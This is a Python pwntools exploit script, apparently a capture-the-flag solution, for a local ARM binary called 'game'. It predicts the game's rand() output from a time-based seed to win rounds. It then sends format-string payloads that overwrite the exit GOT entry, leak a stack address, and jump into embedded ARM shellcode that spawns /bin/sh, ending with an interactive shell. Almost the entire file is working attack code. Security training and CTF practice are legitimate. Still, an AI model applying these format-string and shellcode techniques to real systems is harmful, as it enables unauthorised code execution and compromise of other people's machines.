from pwn import *
import time
from ctypes import CDLL

main = 0x10855 
exit_got = 0x22034
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00"
MANA = 0 
HP = 0
BOSS = 0

#r = process(["qemu-arm-static","-g","12345", "./game"])
r = process(["./game"])
proc = CDLL("libc.so.6")
proc.srand(proc.time(0))
log.info('seed: %#x' % proc.time(0))

def getInfo():
	global MANA,HP,BOSS
	r.recvuntil("| Your MANA: ")
	MANA = int(r.recvuntil("\n"))
	r.recvuntil("| Your HP: ")
	HP = int(r.recvuntil("\n"))
	r.recvuntil("| BOSS HP: ")
	BOSS = int(r.recvuntil("\n"))

def attack(c):
	r.recvuntil(">> ")
	r.sendline(str(c))
	r.recvuntil(">> ")
	r.sendline(str(9))
	getInfo()
	
def defense(c):
	r.recvuntil(">> ")
	r.sendline(str(c))
	getInfo()
	
def skill(n):
	s = int(n /0xBADC0DE)
	if s < 1:
		s = 1
	if s > 5:
		s = 5
	r.recvuntil(">> ")
	r.sendline(str(s))
	getInfo()
	
def play():
	while 1:
		attack((proc.rand()%3)+1)
		if BOSS < 0:
			break
		defense((proc.rand()%3)+1)
		if BOSS < 0:
			break
		if MANA >= 0x175B81BB:
			skill(MANA)
			if BOSS < 0:
				break
#raw_input("?")
	
play()
print r.recvuntil("You are Winner!")
payload = '%'+str(main&0xffff)+'x%15$hn'
payload += '%'+str((main>>16)-(main&0xffff)&0xffff)+'x%16$hn'
payload += 'leak:%40$p'
payload += 'A'*(40-len(payload))
payload += p32(exit_got)
payload += p32(exit_got+2)
r.sendline(payload)
r.recvuntil("leak:")
shell_addr = int(r.recv(10),16)-0x66
log.info("shell_addr: %#x",shell_addr)
getInfo()
defense((proc.rand()%3)+1)
if MANA >= 0x175b81bc:
	skill(MANA)
play()
print r.recvuntil("You are Winner!")
payload = '%'+str(shell_addr&0xffff)+'x%15$hn'
payload += '%'+str((shell_addr>>16)-(shell_addr&0xffff)&0xffff)+'x%16$hn'
payload += 'A'*(40-len(payload))
payload += p32(exit_got)
payload += p32(exit_got+2)
payload = payload.ljust(50,'A')
payload += shellcode
r.sendline(payload)

r.interactive()